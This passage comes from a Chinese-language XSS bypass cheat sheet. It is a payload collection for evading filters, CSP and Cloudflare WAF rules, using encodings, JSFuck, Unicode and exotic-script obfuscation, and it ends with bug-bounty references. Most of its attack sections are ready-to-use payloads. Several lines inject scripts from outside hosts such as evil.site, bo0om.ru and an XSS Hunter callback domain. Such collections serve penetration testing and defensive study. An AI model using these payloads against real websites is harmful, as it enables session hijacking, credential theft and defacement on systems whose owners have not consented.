[11].findIndex(alert)
[12].forEach(alert);
```

From [@theMiddle](https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/) - 使用全局变量bypass

Object.keys() 方法返回特定对象自己的属性名称的数组，其顺序与普通循环中的顺序相同。 这意味着我们可以通过使用**索引号而不是函数名称**来访问任何 JavaScript 函数。

```javascript
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
// 5
```

然后调用alert是：

```javascript
Object.keys(self)[5]
// "alert"
self[Object.keys(self)[5]]("1") // alert("1")
```

我们可以使用正则表达式找到“alert”，例如 ^a[rel]+t$ :

```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}} //新函数 a() 上的绑定函数alert

// 你可以使用函数a()与对象值

self[Object.keys(self)[a()]]("1") // alert("1")
```

一行代码:
```javascript
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("1")
```

作者[@quanyang](https://twitter.com/quanyang/status/1078536601184030721) 的payload

```javascript
prompt`${document.domain}`
document.location='java\tscript:alert(1)'
document.location='java\rscript:alert(1)'
document.location='java\tscript:alert(1)'
```

作者[@404death](https://twitter.com/404death/status/1011860096685502464)  的payload

```javascript
eval('ale'+'rt(0)');
Function("ale"+"rt(1)")();
new Function`al\ert\`6\``;

constructor.constructor("aler"+"t(3)")();
[].filter.constructor('ale'+'rt(4)')();

top["al"+"ert"](5);
top[8680439..toString(30)](7);
top[/al/.source+/ert/.source](8);
top['al\x65rt'](9);

open('java'+'script:ale'+'rt(11)');
location='javascript:ale'+'rt(12)';

setTimeout`alert\u0028document.domain\u0029`;
setTimeout('ale'+'rt(2)');
setInterval('ale'+'rt(10)');
Set.constructor('ale'+'rt(13)')();
Set.constructor`al\x65rt\x2814\x29```;
```

使用替代方式绕过触发alert

```javascript
var i = document.createElement("iframe");
i.onload = function(){
  i.contentWindow.alert(1);
}
document.appendChild(i);

// Bypassed security
XSSObject.proxy = function (obj, name, report_function_name, exec_original) {
      var proxy = obj[name];
      obj[name] = function () {
        if (exec_original) {
          return proxy.apply(this, arguments);
        }
      };
      XSSObject.lockdown(obj, name);
  };
XSSObject.proxy(window, 'alert', 'window.alert', false);
```

### 不使用">"

不需要关闭标签。

```javascript
<svg onload=alert(1)//
```

### 使用Unicode编码绕过"<" 和 ">"

Unicode 编码 U+FF1C = "<"   U+FF1E = ">"
>注：没测试成功，也许在某些特定情况下能用

```javascript
＜script/src=//evil.site/poc.js＞
```

### 绕过 ";" 使用另一种字符

```javascript
'te' * alert('*') * 'xt';
'te' / alert('/') / 'xt';
'te' % alert('%') % 'xt';
'te' - alert('-') - 'xt';
'te' + alert('+') + 'xt';
'te' ^ alert('^') ^ 'xt';
'te' > alert('>') > 'xt';
'te' < alert('<') < 'xt';
'te' == alert('==') == 'xt';
'te' & alert('&') & 'xt';
'te' , alert(',') , 'xt';
'te' | alert('|') | 'xt';
'te' ? alert('ifelsesh') : 'xt';
'te' in alert('in') in 'xt';
'te' instanceof alert('instanceof') instanceof 'xt';
```

### 使用HTML encoding bypass

```javascript
%26%2397;lert(1)
&#97;&#108;&#101;&#114;&#116;
></script><svg onload=%26%2397%3B%26%23108%3B%26%23101%3B%26%23114%3B%26%23116%3B(document.domain)>
```

### 使用Katakana绕过

使用 [Katakana](https://github.com/aemkei/katakana.js) 库

```javascript
javascript:([,ウ,,,,ア]=[]+{},[ネ,ホ,ヌ,セ,,ミ,ハ,ヘ,,,ナ]=[!!ウ]+!ウ+ウ.ウ)[ツ=ア+ウ+ナ+ヘ+ネ+ホ+ヌ+ア+ネ+ウ+ホ][ツ](ミ+ハ+セ+ホ+ネ+'(-~ウ)')()
```

### 使用楔形文字绕过

```javascript
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```

### 使用Lontara绕过

```javascript
ᨆ='',ᨊ=!ᨆ+ᨆ,ᨎ=!ᨊ+ᨆ,ᨂ=ᨆ+{},ᨇ=ᨊ[ᨆ++],ᨋ=ᨊ[ᨏ=ᨆ],ᨃ=++ᨏ+ᨆ,ᨅ=ᨂ[ᨏ+ᨃ],ᨊ[ᨅ+=ᨂ[ᨆ]+(ᨊ.ᨎ+ᨂ)[ᨆ]+ᨎ[ᨃ]+ᨇ+ᨋ+ᨊ[ᨏ]+ᨅ+ᨇ+ᨂ[ᨆ]+ᨋ][ᨅ](ᨎ[ᨆ]+ᨎ[ᨏ]+ᨊ[ᨃ]+ᨋ+ᨇ+"(ᨆ)")()
```

更多方法 http://aem1k.com/aurebesh.js/#

### 使用ECMAScript6绕过

```html
<script>alert&DiacriticalGrave;1&DiacriticalGrave;</script>
```

### 使用8进制绕过

```javascript
javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76'
```

### 使用Unicode绕过

```javascript
小于号 < Unicode字符U+FF1C小于符号（编码为%EF%BC%9C）转换为U+003C

双引号 " Unicode字符U+02BA（编码为%CA%BA)转换为U+0022

单引号 ' Unicode字符U+02B9(编码为%CA%B9)转换为U+0027

例子
http://www.example.net/something%CA%BA%EF%BC%9E%EF%BC%9Csvg%20onload=alert%28/XSS/%29%EF%BC%9E/

%EF%BC%9E = >
%EF%BC%9C = <
```

使用Unicode字符转换为大写绕过

```javascript
İ (%c4%b0).toLowerCase() => i
ı (%c4%b1).toUpperCase() => I
ſ (%c5%bf) .toUpperCase() => S
K (%E2%84%AA).toLowerCase() => k

<ſvg onload=... > become <SVG ONLOAD=...>
<ıframe id=x onload=>.toUpperCase() become <IFRAME ID=X ONLOAD=>
```



### 使用UTF-8绕过

```javascript
< = %C0%BC = %E0%80%BC = %F0%80%80%BC
> = %C0%BE = %E0%80%BE = %F0%80%80%BE
' = %C0%A7 = %E0%80%A7 = %F0%80%80%A7
" = %C0%A2 = %E0%80%A2 = %F0%80%80%A2
" = %CA%BA
' = %CA%B9
```

### 使用UTF-16be绕过

```javascript
%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E%00
\x00<\x00s\x00v\x00g\x00/\x00o\x00n\x00l\x00o\x00a\x00d\x00=\x00a\x00l\x00e\x00r\x00t\x00(\x00)\x00>
```

### 使用UTF-32绕过

```js
%00%00%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

### 使用 BOM绕过

Byte Order Mark (页面必须以 BOM 字符开头)
BOM字符允许覆盖页面的字符集

```js
UTF-16 编码的 BOM 字符：
大字节序 : 0xFE 0xFF
小字节序 : 0xFF 0xFE
XSS : %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

UTF-32 编码的 BOM 字符：
大字节序 : 0x00 0x00 0xFE 0xFF
小字节序 : 0xFF 0xFE 0x00 0x00
XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
```

### 使用各种编码绕过

```javascript
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />
<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>
<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"("+$.___+")"+"\"")())();</script>
<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
```

### 使用jsfuck绕过

在线网址 [jsfuck](http://www.jsfuck.com/)

```javascript
[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
```

## 绕过CSP

检查 CSP 是否开启 [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) 
 [如何使用 Google 的 CSP Evaluator 绕过 CSP](https://websecblog.com/vulns/google-csp-evaluator/)

### 使用 Google 的 JSONP 绕过 CSP (Trick by [@apfeifer27](https://twitter.com/apfeifer27))

//google.com/complete/search?client=chrome&jsonp=alert(1);

```js
<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
```

更多JSONP端点参考：
* [/Intruders/jsonp_endpoint.txt](Intruders/jsonp_endpoint.txt)
* [JSONBee/jsonp.txt](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt)

### 绕过CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)

适用于CSP，如： `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, ```
```
http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;
```

```js
script=document.createElement('script');
script.src='//bo0om.ru/csp.js';
window.frames[0].document.head.appendChild(script);
```

### 绕过CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)

```js
// 使用Inline和Eval绕过CSP

d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://[YOUR_XSSHUNTER_USERNAME].xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
```

### 绕过CSP by [@akita_zen](https://twitter.com/akita_zen)

适用于CSP，如：`script-src self`

```js
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### 绕过CSP by [@404death](https://twitter.com/404death/status/1191222237782659072)

适用于CSP，如： `script-src 'self' data:` 参考文章 [mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src).

```javascript
<script src="data:,alert(1)">/</script>
```


## 常见WAF绕过

### Cloudflare WAF Bypasses by [@Bohdan Korzhynskyi](https://twitter.com/bohdansec)

#### 记录时间：2021 年 1 月 25 日

```html
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>
```

#### 记录时间：2020 年 4 月 21 日

```html
<svg/OnLoad="`${prompt``}`">
```

#### 记录时间：2019 年 8 月 22 日

```html
<svg/onload=%26nbsp;alert`bohdan`+
```

#### 记录时间：2019 年 6 月 5 日

```html
1'"><img/src/onerror=.1|alert``>
```

#### 记录时间：2019 年 6 月 3 日

```html
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>
```

### Cloudflare WAF Bypass - 2019 年 3 月 22 日 (by @RakeshMane10)

```
<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
```

### Cloudflare WAF Bypass - 2018 年 2 月 27 日

```html
<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Chrome Auditor  - 2018 年 8 月 9 日

```javascript
</script><svg><script>alert(1)-%26apos%3B
```

例子 @brutelogic 
```
https://brutelogic.com.br/xss.php(https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
```

>考虑到多数WAF都是基于正则拦截，测试过程中遇到XSS被WAF拦截的话建议使用“减法”确认到底是什么关键词被拦截。如`<img src=x onerror=alert(1)>`被拦截，将代码`<img src=x onerror=alert(1)>`改为`<img src=x onerror=>`查看是否拦截，以此类推，确认被拦截关键词然后利用各种方式绕过。

### XSS bypass备忘清单

 [XSS bypass备忘清单](https://www.ddosi.org/xss-bypass/)


## XSS实验室

* [PortSwigger XSS实验室](https://portswigger.net/web-security/all-labs#cross-site-scripting)

## 参考

- [一起学XSS实战案例](https://wy.zone.ci/searchbug.php?q=%E4%B8%80%E8%B5%B7%E5%AD%A6xss&page=2)
- [XSS bypass备忘清单](https://www.ddosi.org/xss-bypass/)
- [Unleashing-an-Ultimate-XSS-Polyglot](https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot)
- tbm
- [(Relative Path Overwrite) RPO XSS - Infinite Security](http://infinite8security.blogspot.com/2016/02/welcome-readers-as-i-promised-this-post.html)
- [RPO TheSpanner](http://www.thespanner.co.uk/2014/03/21/rpo/)
- [RPO Gadget - innerthmtl](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/)
- [Relative Path Overwrite - Detectify](https://support.detectify.com/support/solutions/articles/48001048955-relative-path-overwrite)
- [XSS ghettoBypass - d3adend](http://d3adend.org/xss/ghettoBypass)
- [XSS without HTML: Client-Side Template Injection with AngularJS](http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html)
- [XSSING WEB PART - 2 - Rakesh Mane](http://blog.rakeshmane.com/2017/08/xssing-web-part-2.html)
- [Making an XSS triggered by CSP bypass on Twitter. @tbmnull](https://www.buaq.net/go-25883.html)
- [Ways to alert(document.domain) - @tomnomnom](https://gist.github.com/tomnomnom/14a918f707ef0685fdebd90545580309)
- [D1T1 - Michele Spagnuolo and Lukas Wilschelbaum - So We Broke All CSPs](https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [Sleeping stored Google XSS Awakens a $5000 Bounty](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by Patrik Fehrenbach
- [RPO that lead to information leakage in Google](https://web.archive.org/web/20220521125028/https://blog.innerht.ml/rpo-gadgets/) by filedescriptor
- [God-like XSS, Log-in, Log-out, Log-in](https://whitton.io/articles/uber-turning-self-xss-into-good-xss/) in Uber by Jack Whitton
- [Three Stored XSS in Facebook](http://www.breaksec.com/?p=6129) by Nirgoldshlager
- [Using a Braun Shaver to Bypass XSS Audit and WAF](https://blog.bugcrowd.com/guest-blog-using-a-braun-shaver-to-bypass-xss-audit-and-waf-by-frans-rosen-detectify) by Frans Rosen
- [An XSS on Facebook via PNGs & Wonky Content Types](https://whitton.io/articles/xss-on-facebook-via-png-content-types/) by Jack Whitton
- [Stored XSS in *.ebay.com](https://whitton.io/archive/persistent-xss-on-myworld-ebay-com/) by Jack Whitton
- [Complicated, Best Report of Google XSS](https://sites.google.com/site/bughunteruniversity/best-reports/account-recovery-xss) by Ramzes
- [Tricky Html Injection and Possible XSS in sms-be-vip.twitter.com](https://hackerone.com/reports/150179) by secgeek
- [Command Injection in Google Console](http://www.pranav-venkat.com/2016/03/command-injection-which-got-me-6000.html) by Venkat S
- [Facebook's Moves - OAuth XSS](http://www.paulosyibelo.com/2015/12/facebooks-moves-oauth-xss.html) by PAULOS YIBELO
- [Stored XSS on developer.uber.com via admin account compromise in Uber](https://hackerone.com/reports/152067) by James Kettle (albinowax)
- [Yahoo Mail stored XSS](https://klikki.fi/adv/yahoo.html) by Klikki Oy
- [Abusing XSS Filter: One ^ leads to XSS(CVE-2016-3212)](http://mksben.l0.cm/2016/07/xxn-caret.html) by Masato Kinugawa
- [Youtube XSS](https://labs.detectify.com/2015/06/06/google-xss-turkey/) by fransrosen
- [Best Google XSS again](https://sites.google.com/site/bughunteruniversity/best-reports/openredirectsthatmatter) - by Krzysztof Kotowicz
- [IE & Edge URL parsing Problem](https://labs.detectify.com/2016/10/24/combining-host-header-injection-and-lax-host-parsing-serving-malicious-data/) - by detectify
- [Google XSS subdomain Clickjacking](http://sasi2103.blogspot.sg/2016/09/combination-of-techniques-lead-to-dom.html)
- [Microsoft XSS and Twitter XSS](https://wesecureapp.com/blog/xss-by-tossing-cookies/)
- [Flash XSS mega nz](https://labs.detectify.com/2013/02/14/how-i-got-the-bug-bounty-for-mega-co-nz-xss/) - by frans
- [xss in google IE, Host Header Reflection](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [Years ago Google xss](http://conference.hitb.org/hitbsecconf2012ams/materials/D1T2%20-%20Itzhak%20Zuk%20Avraham%20and%20Nir%20Goldshlager%20-%20Killing%20a%20Bug%20Bounty%20Program%20-%20Twice.pdf)
- [xss in google by IE weird behavior](http://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)
- [xss in Yahoo Fantasy Sport](https://web.archive.org/web/20161228182923/http://dawgyg.com/2016/12/07/stored-xss-affecting-all-fantasy-sports-fantasysports-yahoo-com-2/)
- [xss in Yahoo Mail Again, worth $10000](https://klikki.fi/adv/yahoo2.html) by Klikki Oy
- [Sleeping XSS in Google](https://blog.it-securityguard.com/bugbounty-sleeping-stored-google-xss-awakens-a-5000-bounty/) by securityguard
- [Decoding a .htpasswd to earn a payload of money](https://blog.it-securityguard.com/bugbounty-decoding-a-%F0%9F%98%B1-00000-htpasswd-bounty/) by securityguard
- [Google Account Takeover](http://www.orenh.com/2013/11/google-account-recovery-vulnerability.html#comment-form)
- [AirBnb Bug Bounty: Turning Self-XSS into Good-XSS #2](http://www.geekboy.ninja/blog/airbnb-bug-bounty-turning-self-xss-into-good-xss-2/) by geekboy
- [Uber Self XSS to Global XSS](https://httpsonly.blogspot.hk/2016/08/turning-self-xss-into-good-xss-v2.html)
- [How I found a $5,000 Google Maps XSS (by fiddling with Protobuf)](https://medium.com/@marin_m/how-i-found-a-5-000-google-maps-xss-by-fiddling-with-protobuf-963ee0d9caff#.cktt61q9g) by Marin MoulinierFollow
- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities](https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/) by Brett
- [XSSI, Client Side Brute Force](http://blog.intothesymmetry.com/2017/05/cross-origin-brute-forcing-of-saml-and.html)
- [postMessage XSS on a million sites - December 15, 2016 - Mathias Karlsson](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)
- [postMessage XSS Bypass](https://hackerone.com/reports/231053)
- [XSS in Uber via Cookie](http://zhchbin.github.io/2017/08/30/Uber-XSS-via-Cookie/) by zhchbin
- [Stealing contact form data on www.hackerone.com using Marketo Forms XSS with postMessage frame-jumping and jQuery-JSONP](https://hackerone.com/reports/207042) by frans
- [XSS due to improper regex in third party js Uber 7k XSS](http://zhchbin.github.io/2016/09/10/A-Valuable-XSS/)
- [XSS in TinyMCE 2.4.0](https://hackerone.com/reports/262230) by Jelmer de Hen
- [Pass uncoded URL in IE11 to cause XSS](https://hackerone.com/reports/150179)
- [Twitter XSS by stopping redirection and javascript scheme](http://blog.blackfan.ru/2017/09/devtwittercom-xss.html) by Sergey Bobrov
- [Auth DOM Uber XSS](http://stamone-bug-bounty.blogspot.hk/2017/10/dom-xss-auth_14.html)
- [XSS in www.yahoo.com](https://www.youtube.com/watch?v=d9UEVv3cJ0Q&feature=youtu.be)
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html)
- [Stored XSS on Snapchat](https://medium.com/@mrityunjoy/stored-xss-on-snapchat-5d704131d8fd)
- [XSS cheat sheet - PortSwigger](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations - Mario Heiderich, Jörg Schwenk, Tilman Frosch, Jonas Magazinius, Edward Z. Yang](https://cure53.de/fp170.pdf)
- [Self Closing Script](https://twitter.com/PortSwiggerRes/status/1257962800418349056)
- [Bypass < with ＜](https://hackerone.com/reports/639684)
- [Bypassing Signature-Based XSS Filters: Modifying Script Code](https://portswigger.net/support/bypassing-signature-based-xss-filters-modifying-script-code)